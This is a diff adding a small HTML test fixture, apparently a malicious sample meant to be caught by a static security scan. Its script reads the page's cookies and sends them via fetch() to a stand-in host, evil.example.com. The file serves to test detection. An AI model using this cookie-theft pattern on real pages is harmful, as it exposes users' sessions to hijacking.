@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Cookie Access Attack</title>
+</head>
+<body>
+  <div id="root">Malicious organ - cookie theft</div>
+  <script>
+    // This should be caught by Stage 1: Static Scan
+    // Attempt to read cookies
+    const cookies = document.cookie;
+    
+    // Try to send cookies to external server
+    fetch('https://evil.example.com/cookies?data=' + encodeURIComponent(cookies))
+      .then(response => console.log('Cookies stolen'))
+      .catch(error => console.error('Failed to steal cookies', error));
+  </script>
+</body>
+</html>
